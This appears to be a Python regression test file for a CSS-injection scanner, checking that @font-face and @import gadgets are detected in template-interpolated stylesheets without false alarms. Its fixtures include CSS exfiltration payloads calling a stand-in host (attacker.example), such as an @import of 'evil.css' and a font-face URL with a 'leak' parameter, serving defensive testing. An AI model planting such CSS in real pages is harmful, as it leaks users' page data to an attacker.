"""Regression: CSSI gadget detection on template-interpolated stylesheets.

Two defects, both measured before the fix (dev/_cssi_gate_matrix.py,
dev/_fontface_block_probe.py):

  1. `_FONT_FACE_BLOCK_RE` matched the block body with ``[^}]*``.  Template
     interpolation is exactly a brace inside the body -- ``url({{ asset }})``
     or ``.../{{ font }}.woff2`` -- so the capture stopped before
     ``unicode-range:`` and the gadget was missed.  The asymmetry was
     measurable: the structurally identical ``@import`` template form DID
     report (``css_import_injection``), the ``@font-face`` one did not.

  2. `_scan_css_injection` passed only ``params.keys()`` -- parameter
     NAMES -- as gate markers, while what lands in a stylesheet is the
     parameter VALUE.  So the gate could not open on reflection at all,
     except through the template-placeholder branch.

The negative controls matter as much as the positives here: Phase 140
made these rules conditional precisely because an ordinary @font-face or
CDN @import used to be reported as high severity (measured on OWASP Juice
Shop).  A fix that simply widens the rule would reintroduce that.
"""
from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from xssentinel.core import css_injection as cssi  # noqa: E402
from xssentinel.core.layers import content_layers  # noqa: E402


def _types(css: str, markers=None) -> set:
    html = f"<html><head><style>{css}</style></head><body></body></html>"
    res = cssi.analyze_page(html, page_url="http://h/p", extra_markers=markers)
    return {v["type"] for v in res["violations"]}


FF_TPL_URL = ("@font-face { font-family: exfil; "
              "src: url({{ asset_url }}); unicode-range: U+0041; }")
FF_TPL_NAME = ("@font-face { font-family: exfil; "
               "src: url(https://cdn.example.com/{{ font }}.woff2); "
               "unicode-range: U+0041; }")
FF_PLAIN = ("@font-face { font-family: exfil; "
            "src: url(https://cdn.example.com/fonts/exfil.woff2); "
            "unicode-range: U+0041, U+0042; }")
IMP_TPL = "@import url(https://attacker.example/evil.css?v={{ theme }});"
IMP_PLAIN = "@import url(https://cdn.example.com/css/reset.css);"


class TestFontFaceBlockNesting:
    """Defect 1: the block body must survive a brace inside it."""

    def test_brace_in_url_does_not_truncate_body(self):
        body = cssi._FONT_FACE_BLOCK_RE.search(FF_TPL_URL).group(1)
        assert cssi._FONT_FACE_UNICODE_RE.search(body), (
            "unicode-range must stay inside the captured body")
        assert cssi._FONT_FACE_URL_RE.search(body)

    def test_brace_in_filename_does_not_truncate_body(self):
        body = cssi._FONT_FACE_BLOCK_RE.search(FF_TPL_NAME).group(1)
        assert cssi._FONT_FACE_UNICODE_RE.search(body)

    def test_plain_font_face_still_matches_whole_body(self):
        body = cssi._FONT_FACE_BLOCK_RE.search(FF_PLAIN).group(1)
        assert "unicode-range" in body and "src:" in body

    def test_font_face_template_reports_exfil(self):
        assert "css_font_face_exfil" in _types(FF_TPL_URL)

    def test_font_face_template_filename_reports_exfil(self):
        assert "css_font_face_exfil" in _types(FF_TPL_NAME)

    def test_unterminated_block_does_not_run_away(self):
        """A missing close brace must stay bounded, not eat the page."""
        css = "@font-face { src: url(a); unicode-range: U+1; " \
              "body { color: red; } @import url(https://x.example/y.css);"
        body = cssi._FONT_FACE_BLOCK_RE.search(css)
        # Either no match, or a match that does not swallow the whole
        # stylesheet -- never a body containing the trailing @import.
        if body is not None:
            assert "@import" not in body.group(1)

    def test_two_font_faces_both_matched(self):
        css = (FF_PLAIN.replace("exfil", "a") + " " +
               FF_PLAIN.replace("exfil", "b"))
        assert len(cssi._FONT_FACE_BLOCK_RE.findall(css)) == 2


class TestGateNeedsRealEvidence:
    """Phase 140's gate must stay shut without evidence -- both ways."""

    def test_plain_font_face_is_silent(self):
        assert "css_font_face_exfil" not in _types(FF_PLAIN)

    def test_plain_import_is_silent(self):
        assert "css_import_injection" not in _types(IMP_PLAIN)

    def test_value_marker_opens_the_gate(self):
        tmpl = ("@font-face { font-family: exfil; "
                "src: url(https://attacker.example/?leak=THEMEVALUE); "
                "unicode-range: U+0041; }")
        rendered = tmpl.replace("THEMEVALUE", "plainvalue")
        assert "css_font_face_exfil" not in _types(rendered), (
            "with no evidence the gate must stay shut")
        assert "css_font_face_exfil" in _types(rendered,
                                               markers=["plainvalue"]), (
            "the reflected value is the evidence the gate needs")

    def test_unrelated_marker_does_not_open_the_gate(self):
        assert "css_import_injection" not in _types(
            IMP_PLAIN.replace("reset", "reset"),
            markers=["zzz_unrelated_marker"])

    def test_short_marker_still_rejected(self):
        """The >=4-char rule keeps `q` from matching CSS identifiers."""
        css = "@import url(https://cdn.example.com/q.css);"
        assert "css_import_injection" not in _types(css, markers=["q"])


class TestLayerPassesValues:
    """Defect 2: the layer must hand the gate what lands in the CSS."""

    def _run_layer(self, css: str, params: dict) -> set:
        captured = {}

        class _FakeScanner:
            class _Coverage:
                def touch_layer(self, *a, **k):
                    pass

                def record_finding(self, *a, **k):
                    pass

            coverage = _Coverage()
            verbose = False
            findings = []

            def _add(self, f):
                self.findings.append(f)

        real = cssi.analyze_page

        def spy(html, page_url=None, extra_markers=None):
            captured["markers"] = extra_markers
            return real(html, page_url=page_url, extra_markers=extra_markers)

        cssi.analyze_page = spy
        content_layers.cssi_mod.analyze_page = spy
        try:
            html = f"<html><head><style>{css}</style></head></html>"
            content_layers._scan_css_injection(_FakeScanner(), "http://h/p",
                                               html, params)
        finally:
            cssi.analyze_page = real
            content_layers.cssi_mod.analyze_page = real
        return set(captured.get("markers") or [])

    def test_param_value_reaches_the_gate(self):
        css = "@import url(https://attacker.example/evil.css?v=THEMEVALUE);"
        markers = self._run_layer(css, {"theme": "THEMEVALUE"})
        assert "THEMEVALUE" in markers, (
            "the value that lands in CSS must be offered as evidence")

    def test_param_name_still_reaches_the_gate(self):
        css = "@import url(https://cdn.example.com/{{ theme }}.css);"
        markers = self._run_layer(css, {"theme": "THEMEVALUE"})
        assert "theme" in markers, (
            "a stylesheet may name the variable without echoing its value")

    def test_empty_params_yield_none(self):
        css = "@import url(https://cdn.example.com/reset.css);"
        assert self._run_layer(css, {}) == set()
